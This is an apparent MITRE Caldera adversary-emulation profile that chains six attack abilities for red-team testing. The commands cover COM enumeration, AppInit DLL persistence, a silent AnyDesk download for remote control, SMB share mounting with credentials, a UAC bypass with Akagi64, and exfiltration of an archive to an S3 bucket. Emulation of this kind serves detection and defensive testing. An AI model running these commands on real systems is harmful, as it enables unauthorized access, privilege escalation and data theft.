adversary_id: custom_adversary_profile__None__Survey_Paper_APT_Attack_Six_Phases__2023-10-19-22_43_07
name: Custom Adversary Profile
description: [['atomic__reconnaissance'], ['atomic__initial_access'], ['stockpile__command-and-control', 'atomic__command-and-control'], ['stockpile__lateral-movement', 'atomic__lateral-movement'], ['stockpile__privilege_escalation', 'atomic__privilege_escalation'], ['stockpile__exfiltration', 'atomic__exfiltration']]
atomic_ordering:
- afe32d76ebb32d20d0b43707bf271beb # ('afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me') ; {'description': 'This test is designed to enumerate the COM objects listed in HKCR, then output their methods and CLSIDs to a text file.\nAn adversary could then use this information to identify COM objects that might be vulnerable to abuse, such as using them to spawn arbitrary processes. \nSee: https://www.mandiant.com/resources/hunting-com-objects', 'tactic': 'reconnaissance', 'technique': {'attack_id': 'T1592.002', 'name': 'Gather Victim Host Information: Software'}, 'platforms': {'windows': {'psh': {'cleanup': 'remove-item $env:temp\\T1592.002Test1.txt -force -erroraction silentlycontinue; remove-item $env:temp\\clsids.txt -force -erroraction silentlycontinue', 'command': 'New-PSDrive -PSProvider registry -Root HKEY_CLASSES_ROOT -Name HKCR; Get-ChildItem -Path HKCR:\\CLSID -Name | Select -Skip 1 > $env:temp\\clsids.txt; ForEach($CLSID in Get-Content "$env:temp\\clsids.txt"); {try{write-output "$($Position)-$($CLSID)"; write-output "------------"| out-file $env:temp\\T1592.002Test1.txt -append; write-output $($CLSID)| out-file $env:temp\\T1592.002Test1.txt -append; $handle=[activator]::CreateInstance([type]::GetTypeFromCLSID($CLSID)); $handle | get-member -erroraction silentlycontinue | out-file $env:temp\\T1592.002Test1.txt -append; $position += 1} catch{}}', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['afe32d76ebb32d20d0b43707bf271beb', 'None', 'validate_me'], 'plugin': 'atomic'}
- 53ec07fdf1496da055cd8026114957f1 # ('53ec07fdf1496da055cd8026114957f1', 'None', 'None') ; {'description': 'AppInit_DLLs is a mechanism that allows an arbitrary list of DLLs to be loaded into each user mode process on the system. Upon succesfully execution, \nyou will see the message "The operation completed successfully." Each time the DLL is loaded, you will see a message box with a message of "Install AppInit Shim DLL was called!" appear.\nThis will happen regularly as your computer starts up various applications and may in fact drive you crazy. A reliable way to make the message box appear and verify the \nAppInit Dlls are loading is to start the notepad application. Be sure to run the cleanup commands afterwards so you don\'t keep getting message boxes showing up.\n\nNote: If secure boot is enabled, this technique will not work. https://docs.microsoft.com/en-us/windows/win32/dlls/secure-boot-and-appinit-dlls\n', 'tactic': 'multiple', 'technique': {'attack_id': 'T1546.010', 'name': 'Event Triggered Execution: AppInit DLLs'}, 'platforms': {'windows': {'cmd': {'cleanup': 'reg.exe import 9e2f65_T1546.010-cleanup.reg >nul 2>&1', 'command': 'reg.exe import e764f6_T1546.010.reg', 'payloads': ['e764f6_T1546.010.reg', '9e2f65_T1546.010-cleanup.reg']}}}, 'id__dependence__fact': ['53ec07fdf1496da055cd8026114957f1', 'None', 'None'], 'plugin': 'atomic'}
- 7dabcbecab0334b115feefab1630f84a # ('7dabcbecab0334b115feefab1630f84a', 'None', 'validate_me') ; {'description': 'An adversary may attempt to trick the user into downloading AnyDesk and use to establish C2. Download of AnyDesk installer will be at the destination location and ran when sucessfully executed.\n', 'tactic': 'command-and-control', 'technique': {'attack_id': 'T1219', 'name': 'Remote Access Software'}, 'platforms': {'windows': {'psh': {'cleanup': '$file1 = "C:\\Users\\" + $env:username + "\\Desktop\\AnyDesk.exe.exe"; Remove-Item $file1 -ErrorAction Ignore', 'command': 'Invoke-WebRequest -OutFile C:\\Users\\$env:username\\Desktop\\AnyDesk.exe https://download.anydesk.com/AnyDesk.exe; $file1 = "C:\\Users\\" + $env:username + "\\Desktop\\AnyDesk.exe"; Start-Process $file1 /S; ', 'parsers': {'plugins.atomic.app.parsers.atomic_powershell': [{'source': 'validate_me'}]}, 'payloads': []}}}, 'id__dependence__fact': ['7dabcbecab0334b115feefab1630f84a', 'None', 'validate_me'], 'plugin': 'atomic'}
- aa6ec4dd-db09-4925-b9b9-43adeb154686 # ('aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn') ; {'description': 'Mount a windows share', 'tactic': 'lateral-movement', 'technique': {'attack_id': 'T1021.002', 'name': 'Remote Services: SMB/Windows Admin Shares'}, 'platforms': {'windows': {'psh': {'command': 'net use \\\\#{remote.host.fqdn}\\C$ /user:#{domain.user.name} #{domain.user.password}\n', 'cleanup': 'net use \\\\#{remote.host.fqdn}\\C$ /delete\n', 'parsers': {'plugins.stockpile.app.parsers.share_mounted': [{'source': 'remote.host.fqdn', 'edge': 'has_share'}]}}}}, 'id__dependence__fact': ['aa6ec4dd-db09-4925-b9b9-43adeb154686', 'remote.host.fqdn', 'remote.host.fqdn'], 'plugin': 'stockpile'}
- 95ad5d69-563e-477b-802b-4855bfb3be09 # ('95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None') ; {'description': 'Dll Hijack of WOW64 logger wow64log.dll using Akagi.exe', 'tactic': 'privilege-escalation', 'technique': {'attack_id': 'T1548.002', 'name': 'Abuse Elevation Control Mechanism: Bypass User Access Control'}, 'platforms': {'windows': {'cmd,psh': {'command': '.\\Akagi64.exe 30 C:\\Windows\\System32\\cmd.exe\n', 'payloads': ['Akagi64.exe']}}}, 'id__dependence__fact': ['95ad5d69-563e-477b-802b-4855bfb3be09', 'None', 'None'], 'plugin': 'stockpile'}
- e7bf5dc7-62e4-48b2-acf8-abaf8734c19c # ('e7bf5dc7-62e4-48b2-acf8-abaf8734c19c', 'host.dir.compress', 'None') ; {'description': 'Exfiltrate the compressed archive to the provided S3 bucket using the AWS CLI. It is assumed that the user\ncredentials configured with AWS CLI have the proper permissions to write to the target S3 bucket.\n', 'tactic': 'exfiltration', 'technique': {'attack_id': 'T1567.002', 'name': 'Exfiltration to Cloud Storage'}, 'platforms': {'linux': {'sh': {'command': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="exfil-#{paw}-$(basename $LocalFile)";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n', 'cleanup': 'LocalFile=\'#{host.dir.compress}\';\nRemoteName="exfil-#{paw}-$(basename $LocalFile)";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n'}}, 'windows': {'psh': {'command': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "exfil-#{paw}-$($SourceFile.name)";\naws s3 cp #{host.dir.compress} s3://#{s3.source.name}/$RemoteName;\n', 'cleanup': '$SourceFile = (Get-Item #{host.dir.compress});\n$RemoteName = "exfil-#{paw}-$($SourceFile.name)";\naws s3 rm s3://#{s3.source.name}/$RemoteName;\n'}}}, 'id__dependence__fact': ['e7bf5dc7-62e4-48b2-acf8-abaf8734c19c', 'host.dir.compress', 'None'], 'plugin': 'stockpile'}
objective: 495a9828-cab1-44dd-a0ca-66e58177d8cc
tags: []